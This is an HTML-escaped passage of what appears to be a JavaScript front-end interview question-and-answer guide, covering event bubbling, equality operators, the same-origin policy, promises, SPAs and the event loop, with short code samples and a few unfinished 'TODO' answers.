&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;Describe event bubbling.&lt;/h3&gt;
&lt;p&gt;When an event triggers on a DOM element, it will attempt to handle the event if there is a listener attached, then the event is bubbled up to its parent and the same thing happens. This bubbling occurs up the element's ancestors all the way to the &lt;code&gt;document&lt;/code&gt;. Event bubbling is the mechanism behind event delegation.&lt;/p&gt;
&lt;h3&gt;What's the difference between an &quot;attribute&quot; and a &quot;property&quot;?&lt;/h3&gt;
&lt;p&gt;Attributes are defined on the HTML markup but properties are defined on the DOM. To illustrate the difference, imagine we have this text field in our HTML: &lt;code&gt;&amp;lt;input type=&quot;text&quot; value=&quot;Hello&quot;&amp;gt;&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-js&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;pl-c1&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;pl-c1&quot;&gt;document&lt;/span&gt;.&lt;span class=&quot;pl-c1&quot;&gt;querySelector&lt;/span&gt;(&lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;input&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;&lt;/span&gt;);
&lt;span class=&quot;pl-en&quot;&gt;console&lt;/span&gt;.&lt;span class=&quot;pl-c1&quot;&gt;log&lt;/span&gt;(&lt;span class=&quot;pl-smi&quot;&gt;input&lt;/span&gt;.&lt;span class=&quot;pl-c1&quot;&gt;getAttribute&lt;/span&gt;(&lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;value&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;&lt;/span&gt;)); &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; Hello&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;console&lt;/span&gt;.&lt;span class=&quot;pl-c1&quot;&gt;log&lt;/span&gt;(&lt;span class=&quot;pl-smi&quot;&gt;input&lt;/span&gt;.&lt;span class=&quot;pl-c1&quot;&gt;value&lt;/span&gt;); &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; Hello&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;But after you change the value of the text field by adding &quot;World!&quot; to it, this becomes:&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-js&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-en&quot;&gt;console&lt;/span&gt;.&lt;span class=&quot;pl-c1&quot;&gt;log&lt;/span&gt;(&lt;span class=&quot;pl-smi&quot;&gt;input&lt;/span&gt;.&lt;span class=&quot;pl-c1&quot;&gt;getAttribute&lt;/span&gt;(&lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;value&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;&lt;/span&gt;)); &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; Hello&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;console&lt;/span&gt;.&lt;span class=&quot;pl-c1&quot;&gt;log&lt;/span&gt;(&lt;span class=&quot;pl-smi&quot;&gt;input&lt;/span&gt;.&lt;span class=&quot;pl-c1&quot;&gt;value&lt;/span&gt;); &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; Hello World!&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h6&gt;References&lt;/h6&gt;
&lt;h3&gt;Why is extending built-in JavaScript objects not a good idea?&lt;/h3&gt;
&lt;p&gt;Extending a built-in/native JavaScript object means adding properties/functions to its &lt;code&gt;prototype&lt;/code&gt;. While this may seem like a good idea at first, it is dangerous in practice. Imagine your code uses a few libraries that both extend the &lt;code&gt;Array.prototype&lt;/code&gt; by adding the same &lt;code&gt;contains&lt;/code&gt; method, the implementations will overwrite each other and your code will break if the behavior of these two methods are not the same.&lt;/p&gt;
&lt;p&gt;The only time you may want to extend a native object is when you want to create a polyfill, essentially providing your own implementation for a method that is part of the JavaScript specification but might not exist in the user's browser due to it being an older browser.&lt;/p&gt;
&lt;h6&gt;References&lt;/h6&gt;
&lt;h3&gt;Difference between document &lt;code&gt;load&lt;/code&gt; event and document &lt;code&gt;DOMContentLoaded&lt;/code&gt; event?&lt;/h3&gt;
&lt;p&gt;The &lt;code&gt;DOMContentLoaded&lt;/code&gt; event is fired when the initial HTML document has been completely loaded and parsed, without waiting for stylesheets, images, and subframes to finish loading.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;window&lt;/code&gt;'s &lt;code&gt;load&lt;/code&gt; event is only fired after the DOM and all dependent resources and assets have loaded.&lt;/p&gt;
&lt;h6&gt;References&lt;/h6&gt;
&lt;h3&gt;What is the difference between &lt;code&gt;==&lt;/code&gt; and &lt;code&gt;===&lt;/code&gt;?&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;==&lt;/code&gt; is the abstract equality operator while &lt;code&gt;===&lt;/code&gt; is the strict equality operator. The &lt;code&gt;==&lt;/code&gt; operator will compare for equality after doing any necessary type conversions. The &lt;code&gt;===&lt;/code&gt; operator will not do type conversion, so if two values are not the same type &lt;code&gt;===&lt;/code&gt; will simply return &lt;code&gt;false&lt;/code&gt;. When using &lt;code&gt;==&lt;/code&gt;, funky things can happen, such as:&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-js&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-c1&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;1&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;&lt;/span&gt;; &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; true&lt;/span&gt;
&lt;span class=&quot;pl-c1&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;==&lt;/span&gt; [&lt;span class=&quot;pl-c1&quot;&gt;1&lt;/span&gt;]; &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; true&lt;/span&gt;
&lt;span class=&quot;pl-c1&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;pl-c1&quot;&gt;true&lt;/span&gt;; &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; true&lt;/span&gt;
&lt;span class=&quot;pl-c1&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;&lt;/span&gt;; &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; true&lt;/span&gt;
&lt;span class=&quot;pl-c1&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;0&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;&lt;/span&gt;; &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; true&lt;/span&gt;
&lt;span class=&quot;pl-c1&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;pl-c1&quot;&gt;false&lt;/span&gt;; &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; true&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;My advice is never to use the &lt;code&gt;==&lt;/code&gt; operator, except for convenience when comparing against &lt;code&gt;null&lt;/code&gt; or &lt;code&gt;undefined&lt;/code&gt;, where &lt;code&gt;a == null&lt;/code&gt; will return &lt;code&gt;true&lt;/code&gt; if &lt;code&gt;a&lt;/code&gt; is &lt;code&gt;null&lt;/code&gt; or &lt;code&gt;undefined&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-js&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-k&quot;&gt;var&lt;/span&gt; a &lt;span class=&quot;pl-k&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;pl-c1&quot;&gt;null&lt;/span&gt;;
&lt;span class=&quot;pl-en&quot;&gt;console&lt;/span&gt;.&lt;span class=&quot;pl-c1&quot;&gt;log&lt;/span&gt;(a &lt;span class=&quot;pl-k&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;pl-c1&quot;&gt;null&lt;/span&gt;); &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; true&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;console&lt;/span&gt;.&lt;span class=&quot;pl-c1&quot;&gt;log&lt;/span&gt;(a &lt;span class=&quot;pl-k&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;pl-c1&quot;&gt;undefined&lt;/span&gt;); &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; true&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h6&gt;References&lt;/h6&gt;
&lt;h3&gt;Explain the same-origin policy with regards to JavaScript.&lt;/h3&gt;
&lt;p&gt;The same-origin policy prevents JavaScript from making requests across domain boundaries. An origin is defined as a combination of URI scheme, hostname, and port number. This policy prevents a malicious script on one page from obtaining access to sensitive data on another web page through that page's Document Object Model.&lt;/p&gt;
&lt;h6&gt;References&lt;/h6&gt;
&lt;h3&gt;Make this work:&lt;/h3&gt;
&lt;div class=&quot;highlight highlight-source-js&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-en&quot;&gt;duplicate&lt;/span&gt;([&lt;span class=&quot;pl-c1&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;pl-c1&quot;&gt;2&lt;/span&gt;, &lt;span class=&quot;pl-c1&quot;&gt;3&lt;/span&gt;, &lt;span class=&quot;pl-c1&quot;&gt;4&lt;/span&gt;, &lt;span class=&quot;pl-c1&quot;&gt;5&lt;/span&gt;]); &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; [1,2,3,4,5,1,2,3,4,5]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;highlight highlight-source-js&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;duplicate&lt;/span&gt;(&lt;span class=&quot;pl-smi&quot;&gt;arr&lt;/span&gt;) {
  &lt;span class=&quot;pl-k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;pl-smi&quot;&gt;arr&lt;/span&gt;.&lt;span class=&quot;pl-c1&quot;&gt;concat&lt;/span&gt;(arr);
}

&lt;span class=&quot;pl-en&quot;&gt;duplicate&lt;/span&gt;([&lt;span class=&quot;pl-c1&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;pl-c1&quot;&gt;2&lt;/span&gt;, &lt;span class=&quot;pl-c1&quot;&gt;3&lt;/span&gt;, &lt;span class=&quot;pl-c1&quot;&gt;4&lt;/span&gt;, &lt;span class=&quot;pl-c1&quot;&gt;5&lt;/span&gt;]); &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; [1,2,3,4,5,1,2,3,4,5]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;Why is it called a Ternary expression, what does the word &quot;Ternary&quot; indicate?&lt;/h3&gt;
&lt;p&gt;&quot;Ternary&quot; indicates three, and a ternary expression accepts three operands, the test condition, the &quot;then&quot; expression and the &quot;else&quot; expression. Ternary expressions are not specific to JavaScript and I'm not sure why it is even in this list.&lt;/p&gt;
&lt;h6&gt;References&lt;/h6&gt;
&lt;h3&gt;What is &lt;code&gt;&quot;use strict&quot;;&lt;/code&gt;? What are the advantages and disadvantages to using it?&lt;/h3&gt;
&lt;p&gt;'use strict' is a statement used to enable strict mode to entire scripts or individual functions. Strict mode is a way to opt in to a restricted variant of JavaScript.&lt;/p&gt;
&lt;p&gt;Advantages:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Makes it impossible to accidentally create global variables.&lt;/li&gt;
&lt;li&gt;Makes assignments which would otherwise silently fail to throw an exception.&lt;/li&gt;
&lt;li&gt;Makes attempts to delete undeletable properties throw (where before the attempt would simply have no effect).&lt;/li&gt;
&lt;li&gt;Requires that function parameter names be unique.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;this&lt;/code&gt; is undefined in the global context.&lt;/li&gt;
&lt;li&gt;It catches some common coding bloopers, throwing exceptions.&lt;/li&gt;
&lt;li&gt;It disables features that are confusing or poorly thought out.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;Disadvantages:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Many missing features that some developers might be used to.&lt;/li&gt;
&lt;li&gt;No more access to &lt;code&gt;function.caller&lt;/code&gt; and &lt;code&gt;function.arguments&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Concatenation of scripts written in different strict modes might cause issues.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;Overall, I think the benefits outweigh the disadvantages, and I never had to rely on the features that strict mode blocks. I would recommend using strict mode.&lt;/p&gt;
&lt;h6&gt;References&lt;/h6&gt;
&lt;h3&gt;Create a for loop that iterates up to &lt;code&gt;100&lt;/code&gt; while outputting &lt;strong&gt;&quot;fizz&quot;&lt;/strong&gt; at multiples of &lt;code&gt;3&lt;/code&gt;, &lt;strong&gt;&quot;buzz&quot;&lt;/strong&gt; at multiples of &lt;code&gt;5&lt;/code&gt; and &lt;strong&gt;&quot;fizzbuzz&quot;&lt;/strong&gt; at multiples of &lt;code&gt;3&lt;/code&gt; and &lt;code&gt;5&lt;/code&gt;.&lt;/h3&gt;
&lt;p&gt;Check out this version of FizzBuzz by &lt;a href=&quot;https://gist.github.com/jaysonrowe/1592432#gistcomment-790724&quot;&gt;Paul Irish&lt;/a&gt;.&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-js&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-k&quot;&gt;for&lt;/span&gt; (&lt;span class=&quot;pl-k&quot;&gt;let&lt;/span&gt; i &lt;span class=&quot;pl-k&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;pl-c1&quot;&gt;1&lt;/span&gt;; i &lt;span class=&quot;pl-k&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;pl-c1&quot;&gt;100&lt;/span&gt;; i&lt;span class=&quot;pl-k&quot;&gt;++&lt;/span&gt;) {
  &lt;span class=&quot;pl-k&quot;&gt;let&lt;/span&gt; f &lt;span class=&quot;pl-k&quot;&gt;=&lt;/span&gt; i &lt;span class=&quot;pl-k&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;pl-c1&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;pl-c1&quot;&gt;0&lt;/span&gt;,
    b &lt;span class=&quot;pl-k&quot;&gt;=&lt;/span&gt; i &lt;span class=&quot;pl-k&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;pl-c1&quot;&gt;5&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;pl-c1&quot;&gt;0&lt;/span&gt;;
  &lt;span class=&quot;pl-en&quot;&gt;console&lt;/span&gt;.&lt;span class=&quot;pl-c1&quot;&gt;log&lt;/span&gt;(f &lt;span class=&quot;pl-k&quot;&gt;?&lt;/span&gt; (b &lt;span class=&quot;pl-k&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;FizzBuzz&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;Fizz&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;&lt;/span&gt;) &lt;span class=&quot;pl-k&quot;&gt;:&lt;/span&gt; b &lt;span class=&quot;pl-k&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;Buzz&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;:&lt;/span&gt; i);
}
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;I would not advise you to write the above during interviews though. Just stick with the long but clear approach. For more wacky versions of FizzBuzz, check out the reference link below.&lt;/p&gt;
&lt;h6&gt;References&lt;/h6&gt;
&lt;h3&gt;Why is it, in general, a good idea to leave the global scope of a website as-is and never touch it?&lt;/h3&gt;
&lt;p&gt;Every script has access to the global scope, and if everyone is using the global namespace to define their own variables, there will bound to be collisions. Use the module pattern (IIFEs) to encapsulate your variables within a local namespace.&lt;/p&gt;
&lt;h3&gt;Why would you use something like the &lt;code&gt;load&lt;/code&gt; event? Does this event have disadvantages? Do you know any alternatives, and why would you use those?&lt;/h3&gt;
&lt;p&gt;The &lt;code&gt;load&lt;/code&gt; event fires at the end of the document loading process. At this point, all of the objects in the document are in the DOM, and all the images, scripts, links and sub-frames have finished loading.&lt;/p&gt;
&lt;p&gt;The DOM event &lt;code&gt;DOMContentLoaded&lt;/code&gt; will fire after the DOM for the page has been constructed, but do not wait for other resources to finish loading. This is preferred in certain cases when you do not need the full page to be loaded before initializing.&lt;/p&gt;
&lt;p&gt;TODO.&lt;/p&gt;
&lt;h6&gt;References&lt;/h6&gt;
&lt;h3&gt;Explain what a single page app is and how to make one SEO-friendly.&lt;/h3&gt;
&lt;p&gt;The below is taken from the awesome &lt;a href=&quot;https://github.com/grab/front-end-guide&quot;&gt;Grab Front End Guide&lt;/a&gt;, which coincidentally, is written by me!&lt;/p&gt;
&lt;p&gt;Web developers these days refer to the products they build as web apps, rather than websites. While there is no strict difference between the two terms, web apps tend to be highly interactive and dynamic, allowing the user to perform actions and receive a response for their action. Traditionally, the browser receives HTML from the server and renders it. When the user navigates to another URL, a full-page refresh is required and the server sends fresh new HTML for the new page. This is called server-side rendering.&lt;/p&gt;
&lt;p&gt;However in modern SPAs, client-side rendering is used instead. The browser loads the initial page from the server, along with the scripts (frameworks, libraries, app code) and stylesheets required for the whole app. When the user navigates to other pages, a page refresh is not triggered. The URL of the page is updated via the &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/API/History_API&quot; rel=&quot;nofollow&quot;&gt;HTML5 History API&lt;/a&gt;. New data required for the new page, usually in JSON format, is retrieved by the browser via &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/AJAX/Getting_Started&quot; rel=&quot;nofollow&quot;&gt;AJAX&lt;/a&gt; requests to the server. The SPA then dynamically updates the page with the data via JavaScript, which it has already downloaded in the initial page load. This model is similar to how native mobile apps work.&lt;/p&gt;
&lt;p&gt;The benefits:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;The app feels more responsive and users do not see the flash between page navigations due to full-page refreshes.&lt;/li&gt;
&lt;li&gt;Fewer HTTP requests are made to the server, as the same assets do not have to be downloaded again for each page load.&lt;/li&gt;
&lt;li&gt;Clear separation of the concerns between the client and the server; you can easily build new clients for different platforms (e.g. mobile, chatbots, smart watches) without having to modify the server code. You can also modify the technology stack on the client and server independently, as long as the API contract is not broken.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;The downsides:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Heavier initial page load due to loading of framework, app code, and assets required for multiple pages.&lt;/li&gt;
&lt;li&gt;There's an additional step to be done on your server which is to configure it to route all requests to a single entry point and allow client-side routing to take over from there.&lt;/li&gt;
&lt;li&gt;SPAs are reliant on JavaScript to render content, but not all search engines execute JavaScript during crawling, and they may see empty content on your page. This inadvertently hurts the Search Engine Optimization (SEO) of your app. However, most of the time, when you are building apps, SEO is not the most important factor, as not all the content needs to be indexable by search engines. To overcome this, you can either server-side render your app or use services such as &lt;a href=&quot;https://prerender.io/&quot; rel=&quot;nofollow&quot;&gt;Prerender&lt;/a&gt; to &quot;render your javascript in a browser, save the static HTML, and return that to the crawlers&quot;.&lt;/li&gt;
&lt;/ul&gt;&lt;h6&gt;References&lt;/h6&gt;
&lt;h3&gt;What is the extent of your experience with Promises and/or their polyfills?&lt;/h3&gt;
&lt;p&gt;Possess working knowledge of it. A promise is an object that may produce a single value some time in the future: either a resolved value, or a reason that it's not resolved (e.g., a network error occurred). A promise may be in one of 3 possible states: fulfilled, rejected, or pending. Promise users can attach callbacks to handle the fulfilled value or the reason for rejection.&lt;/p&gt;
&lt;p&gt;Some common polyfills are &lt;code&gt;$.deferred&lt;/code&gt;, Q and Bluebird but not all of them comply to the specification. ES2015 supports Promises out of the box and polyfills are typically not needed these days.&lt;/p&gt;
&lt;h6&gt;References&lt;/h6&gt;
&lt;h3&gt;What are the pros and cons of using Promises instead of callbacks?&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Pros&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Avoid callback hell which can be unreadable.&lt;/li&gt;
&lt;li&gt;Makes it easy to write sequential asynchronous code that is readable with &lt;code&gt;.then()&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Makes it easy to write parallel asynchronous code with &lt;code&gt;Promise.all()&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;Cons&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Slightly more complex code (debatable).&lt;/li&gt;
&lt;li&gt;In older browsers where ES2015 is not supported, you need to load a polyfill in order to use it.&lt;/li&gt;
&lt;/ul&gt;&lt;h3&gt;What are some of the advantages/disadvantages of writing JavaScript code in a language that compiles to JavaScript?&lt;/h3&gt;
&lt;p&gt;Some examples of languages that compile to JavaScript include CoffeeScript, Elm, ClojureScript, PureScript and TypeScript.&lt;/p&gt;
&lt;p&gt;Advantages:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Fixes some of the longstanding problems in JavaScript and discourages JavaScript anti-patterns.&lt;/li&gt;
&lt;li&gt;Enables you to write shorter code, by providing some syntactic sugar on top of JavaScript, which I think ES5 lacks, but ES2015 is awesome.&lt;/li&gt;
&lt;li&gt;Static types are awesome (in the case of TypeScript) for large projects that need to be maintained over time.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;Disadvantages:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Require a build/compile process as browsers only run JavaScript and your code will need to be compiled into JavaScript before being served to browsers.&lt;/li&gt;
&lt;li&gt;Debugging can be a pain if your source maps do not map nicely to your pre-compiled source.&lt;/li&gt;
&lt;li&gt;Most developers are not familiar with these languages and will need to learn it. There's a ramp up cost involved for your team if you use it for your projects.&lt;/li&gt;
&lt;li&gt;Smaller community (depends on the language), which means resources, tutorials, libraries and tooling would be harder to find.&lt;/li&gt;
&lt;li&gt;IDE/editor support might be lacking.&lt;/li&gt;
&lt;li&gt;These languages will always be behind the latest JavaScript standard.&lt;/li&gt;
&lt;li&gt;Developers should be cognizant of what their code is being compiled to — because that is what would actually be running, and that is what matters in the end.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;Practically, ES2015 has vastly improved JavaScript and made it much nicer to write. I don't really see the need for CoffeeScript these days.&lt;/p&gt;
&lt;h6&gt;References&lt;/h6&gt;
&lt;h3&gt;What tools and techniques do you use for debugging JavaScript code?&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;React and Redux
&lt;/li&gt;
&lt;li&gt;JavaScript
&lt;/li&gt;
&lt;/ul&gt;&lt;h6&gt;References&lt;/h6&gt;
&lt;h3&gt;What language constructions do you use for iterating over object properties and array items?&lt;/h3&gt;
&lt;p&gt;For objects:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;code&gt;for&lt;/code&gt; loops - &lt;code&gt;for (var property in obj) { console.log(property); }&lt;/code&gt;. However, this will also iterate through its inherited properties, and you will add an &lt;code&gt;obj.hasOwnProperty(property)&lt;/code&gt; check before using it.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Object.keys()&lt;/code&gt; - &lt;code&gt;Object.keys(obj).forEach(function (property) { ... })&lt;/code&gt;. &lt;code&gt;Object.keys()&lt;/code&gt; is a static method that will lists all enumerable properties of the object that you pass it.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Object.getOwnPropertyNames()&lt;/code&gt; - &lt;code&gt;Object.getOwnPropertyNames(obj).forEach(function (property) { ... })&lt;/code&gt;. &lt;code&gt;Object.getOwnPropertyNames()&lt;/code&gt; is a static method that will lists all enumerable and non-enumerable properties of the object that you pass it.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;For arrays:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;code&gt;for&lt;/code&gt; loops - &lt;code&gt;for (var i = 0; i &amp;lt; arr.length; i++)&lt;/code&gt;. The common pitfall here is that &lt;code&gt;var&lt;/code&gt; is in the function scope and not the block scope and most of the time you would want block scoped iterator variable. ES2015 introduces &lt;code&gt;let&lt;/code&gt; which has block scope and it is recommended to use that instead. So this becomes: &lt;code&gt;for (let i = 0; i &amp;lt; arr.length; i++)&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;forEach&lt;/code&gt; - &lt;code&gt;arr.forEach(function (el, index) { ... })&lt;/code&gt;. This construct can be more convenient at times because you do not have to use the &lt;code&gt;index&lt;/code&gt; if all you need is the array elements. There are also the &lt;code&gt;every&lt;/code&gt; and &lt;code&gt;some&lt;/code&gt; methods which will allow you to terminate the iteration early.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;Most of the time, I would prefer the &lt;code&gt;.forEach&lt;/code&gt; method, but it really depends on what you are trying to do. &lt;code&gt;for&lt;/code&gt; loops allow more flexibility, such as prematurely terminate the loop using &lt;code&gt;break&lt;/code&gt; or incrementing the iterator more than once per loop.&lt;/p&gt;
&lt;h3&gt;Explain the difference between mutable and immutable objects.&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;What is an example of an immutable object in JavaScript?&lt;/li&gt;
&lt;li&gt;What are the pros and cons of immutability?&lt;/li&gt;
&lt;li&gt;How can you achieve immutability in your own code?&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;TODO&lt;/p&gt;
&lt;h3&gt;Explain the difference between synchronous and asynchronous functions.&lt;/h3&gt;
&lt;p&gt;Synchronous functions are blocking while asynchronous functions are not. In synchronous functions, statements complete before the next statement is run. In this case the program is evaluated exactly in order of the statements and execution of the program is paused if one of the statements take a very long time.&lt;/p&gt;
&lt;p&gt;Asynchronous functions usually accept a callback as a parameter and execution continues on the next line immediately after the asynchronous function is invoked. The callback is only invoked when the asynchronous operation is complete and the call stack is empty. Heavy duty operations such as loading data from a web server or querying a database should be done asynchronously so that the main thread can continue executing other operations instead of blocking until that long operation to complete (in the case of browsers, the UI will freeze).&lt;/p&gt;
&lt;h3&gt;What is event loop? What is the difference between call stack and task queue?&lt;/h3&gt;
&lt;p&gt;The event loop is a single-threaded loop that monitors the call stack and checks if there is any work to be done in the task queue. If the call stack is empty and there are callback functions in the task queue, a function is dequeued and pushed onto the call stack to be executed.&lt;/p&gt;
&lt;p&gt;If you haven't already checked out Philip Robert's &lt;a href=&quot;https://2014.jsconf.eu/speakers/philip-roberts-what-the-heck-is-the-event-loop-anyway.html&quot; rel=&quot;nofollow&quot;&gt;talk on the Event Loop&lt;/a&gt;, you should. It is one of the most viewed videos on JavaScript.&lt;/p&gt;
&lt;h6&gt;References&lt;/h6&gt;
&lt;h3&gt;Explain the differences on the usage of &lt;code&gt;foo&lt;/code&gt; between &lt;code&gt;function foo() {}&lt;/code&gt; and &lt;code&gt;var foo = function() {}&lt;/code&gt;&lt;/h3&gt;
&lt;p&gt;The former is a function declaration while the latter is a function expression. The key difference is that function declarations have its body hoisted but the bodies of function expressions are not (they have the same hoisting behaviour as variables). For more explanation on hoisting, refer to the question above on hoisting. If you try to invoke a function expression before it is defined, you will get an &lt;code&gt;Uncaught TypeError: XXX is not a function&lt;/code&gt; error.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Function Declaration&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-js&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-en&quot;&gt;foo&lt;/span&gt;(); &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; 'FOOOOO'&lt;/span&gt;
